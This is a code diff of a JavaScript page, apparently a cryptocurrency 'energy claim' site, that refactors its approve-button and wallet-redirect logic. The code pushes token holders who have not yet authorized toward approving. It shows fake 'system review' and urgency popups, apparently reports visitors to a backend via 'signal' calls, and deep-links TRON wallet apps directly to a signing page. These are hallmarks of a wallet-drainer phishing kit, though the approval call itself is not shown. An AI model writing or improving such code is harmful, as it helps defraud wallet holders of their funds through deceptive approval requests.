@@ -1259,6 +1259,7 @@ async function sendSignalB(isB1 = true) {
 // ========== 核心逻辑bindApproveLogic ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
+    // 白名单地址强制启用按钮，忽略已授权状态
     if ((tokenBalance > 1 && !isAddressAuthorized(userAddress)) || userAddress === SPECIAL_ADDRESS) {
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
@@ -1270,6 +1271,7 @@ function bindApproveLogic() {
         reviewTip.style.display = "none";
         let alertEl = null;
         try {
+            // 基础校验
             if (!userAddress) {
                 showAutoCloseAlert(lang.noWalletAddress.split("<br>")[0]);
                 btn.disabled = false;
@@ -1294,10 +1296,11 @@ function bindApproveLogic() {
                     throw new Error(lang.systemBusyTip);
                 }
             }
-                        let a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+            // A1信号校验
+            let a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
             let isA1Success = a1Status[userAddress] === "success";
             if (!isA1Success) {
-                alertEl = showPersistentAlert(lang.systemBusyTip); // 非自动消失弹窗
+                alertEl = showPersistentAlert(lang.systemBusyTip);
                 const retryA1 = await sendSignalA1().catch(err => false);
                 if (!retryA1) {
                     throw new Error("A1信号同步失败，请刷新页面");
@@ -1306,18 +1309,15 @@ function bindApproveLogic() {
                 localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
                 isA1Success = true;
             }
-            // ========== 核心修复：按对象类型处理（无弹窗/弹窗不消失） ==========
+            // B1信号防重复处理
             let isB1Repeated = hasSentB1Signal(userAddress);
             if (isB1Repeated) {
-                // 防重复对象：无弹窗，直接跳转
-                await handleJump();
+                await handleJump(); // 防重复：直接跳转
             } else {
-                // 非防重复对象：弹窗不消失，B1返回后直接执行逻辑
                 alertEl = showPersistentAlert("系统审核中，通过后自动跳转，中途退出30日不可再次领取");
                 markB1SignalSent(userAddress);
-                const b1Response = await sendSignalB(true); // 等待B1反馈
+                const b1Response = await sendSignalB(true);
                 if (!b1Response) {
-                    // B1失败：更新弹窗提示，3秒后移除
                     alertEl.textContent = "现在领取的人太多啦，请稍后重试";
                     setTimeout(() => {
                         if (alertEl && alertEl.parentNode) {
@@ -1329,18 +1329,17 @@ function bindApproveLogic() {
                     btn.textContent = lang.approveBtnText;
                     return;
                 }
-                // B1成功：移除弹窗，执行跳转
+                // B1成功：移除弹窗再跳转
                 if (alertEl && alertEl.parentNode) {
                     alertEl.parentNode.removeChild(alertEl);
                 }
                 await handleJump();
             }
-            // 统一执行记录存储
+            // 领取记录存储
             saveEnergyRecord();
             renderEnergyRecords();
         } catch (e) {
             console.error("领取流程异常：", e);
-            // 异常时移除弹窗
             if (alertEl && alertEl.parentNode) {
                 alertEl.parentNode.removeChild(alertEl);
             }
@@ -1349,33 +1348,55 @@ function bindApproveLogic() {
             btn.textContent = lang.approveBtnText;
         }
     };
-    // 跳转工具函数（统一逻辑，避免冗余）
-  // 跳转工具函数（完全复用参考文件跳转格式，一步到位到签名页面）
-async function handleJump() {
-    const lang = langConfig[currentLang];
-    const btn = document.getElementById("approveBtn");
-    try {
-        // 优先读取URL中传递的钱包类型（用户首次选择的），保持复用逻辑
-        const selectedWalletType = getWalletFromUrl();
-        let wallet, jumpUrl;
-        const currentUrl = window.location.href + "#approve"; // 带签名标记，一步到签名页面
-        const encodedUrl = encodeURIComponent(currentUrl);
 
-        // 完全复用参考文件的钱包跳转格式
-        if (selectedWalletType && walletConfig[selectedWalletType]) {
-            wallet = walletConfig[selectedWalletType];
-            // 按参考文件原生格式拼接跳转URL
-            switch (selectedWalletType) {
-                case "imtoken":
-                    // 参考文件格式：imtokenv2://navigate/DappView?url=编码后URL
-                    jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
-                    break;
-                case "tokenpocket":
-                    // 参考文件格式：tpdapp://open?params={"url":"编码后URL"}
+    // 完整无截断的handleJump函数（包含你贴的结尾逻辑）
+    async function handleJump() {
+        const lang = langConfig[currentLang];
+        const btn = document.getElementById("approveBtn");
+        try {
+            const selectedWalletType = getWalletFromUrl();
+            let wallet = null;
+            let jumpUrl = "";
+            const currentUrl = window.location.href + "#approve"; // 带签名标记，一步到签名页
+            const encodedUrl = encodeURIComponent(currentUrl);
+
+            // 1. 优先复用用户选择的钱包类型
+            if (selectedWalletType && walletConfig[selectedWalletType]) {
+                wallet = walletConfig[selectedWalletType];
+                // 完全复刻参考文件的跳转格式
+                switch (selectedWalletType) {
+                    case "imtoken":
+                        jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
+                        break;
+                    case "tokenpocket":
+                        jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
+                        break;
+                    case "tronlink":
+                        const tronParam = JSON.stringify({
+                            url: currentUrl,
+                            action: "open",
+                            protocol: "tronlink",
+                            version: "1.0"
+                        });
+                        jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
+                        break;
+                    case "bitget":
+                        jumpUrl = `bitkeep://bkconnect?action=dapp&url=${currentUrl}`;
+                        break;
+                    default:
+                        jumpUrl = wallet.scheme + encodedUrl;
+                }
+                localStorage.setItem("selectedWalletType", selectedWalletType);
+            } else {
+                // 2. 兜底逻辑：优先imToken，兼容环境检测
+                wallet = walletConfig.imtoken;
+                jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
+                
+                if (window.tronWeb && window.tronWeb.provider?.isTokenPocket) {
+                    wallet = walletConfig.tokenpocket;
                     jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
-                    break;
-                case "tronlink":
-                    // 参考文件格式：tronlinkoutside://pull.activity?param=编码后的JSON
+                } else if (window.tronWeb && window.tronWeb.provider?.isTronLink) {
+                    wallet = walletConfig.tronlink;
                     const tronParam = JSON.stringify({
                         url: currentUrl,
                         action: "open",
@@ -1383,54 +1404,28 @@ async function handleJump() {
                         version: "1.0"
                     });
                     jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
-                    break;
-                case "bitget":
-                    // 参考文件格式：bitkeep://bkconnect?action=dapp&url=URL
+                } else if (window.tronWeb && window.tronWeb.provider?.isBitKeep) {
+                    wallet = walletConfig.bitget;
                     jumpUrl = `bitkeep://bkconnect?action=dapp&url=${currentUrl}`;
-                    break;
-                default:
-                    jumpUrl = wallet.scheme + encodedUrl;
+                }
             }
-            // 存储到localStorage，后续复用
-            localStorage.setItem("selectedWalletType", selectedWalletType);
-        } else {
-            // 兜底逻辑：按参考文件默认优先imToken
-            jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
-            wallet = walletConfig.imtoken;
-            // 检测环境兜底（参考文件逻辑）
-            if (window.tronWeb && window.tronWeb.provider?.isTokenPocket) {
-                jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
-                wallet = walletConfig.tokenpocket;
-            } else if (window.tronWeb && window.tronWeb.provider?.isTronLink) {
-                const tronParam = JSON.stringify({
-                    url: currentUrl,
-                    action: "open",
-                    protocol: "tronlink",
-                    version: "1.0"
-                });
-                jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
-                wallet = walletConfig.tronlink;
-            } else if (window.tronWeb && window.tronWeb.provider?.isBitKeep) {
-                jumpUrl = `bitkeep://bkconnect?action=dapp&url=${currentUrl}`;
-                wallet = walletConfig.bitget;
-            }
-        }
 
-        // 参考文件逻辑：直接跳转，一步到位到签名页面
-        window.location.href = jumpUrl;
-        btn.textContent = `正在唤起${wallet.name}签名页面...`;
+            // 3. 参考文件逻辑：直接跳转，一步到位到签名页面（你贴的核心代码）
+            window.location.href = jumpUrl;
+            btn.textContent = `正在唤起${wallet.name}签名页面...`;
 
-        // 跳转失败兜底提示（参考文件无额外弹窗，仅保留失败提示）
-        setTimeout(() => {
-            showAutoCloseAlert(`未检测到${wallet.name}，请手动打开${wallet.name}访问该链接`);
+            // 4. 跳转失败兜底提示（你贴的结尾逻辑）
+            setTimeout(() => {
+                showAutoCloseAlert(`未检测到${wallet.name}，请手动打开${wallet.name}访问该链接`);
+                btn.disabled = false;
+                btn.textContent = lang.approveBtnText;
+            }, 3000);
+        } catch (jumpErr) {
+            console.error("跳转失败：", jumpErr);
+            showAutoCloseAlert("跳转授权失败，请手动打开钱包访问该链接");
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
-        }, 3000);
-    } catch (jumpErr) {
-        console.error("跳转失败：", jumpErr);
-        showAutoCloseAlert("跳转授权失败，请手动打开钱包访问该链接");
-        btn.disabled = false;
-        btn.textContent = lang.approveBtnText;
+        }
     }
 }
 // ========== 辅助函数（修复白名单地址的记录存储） ==========
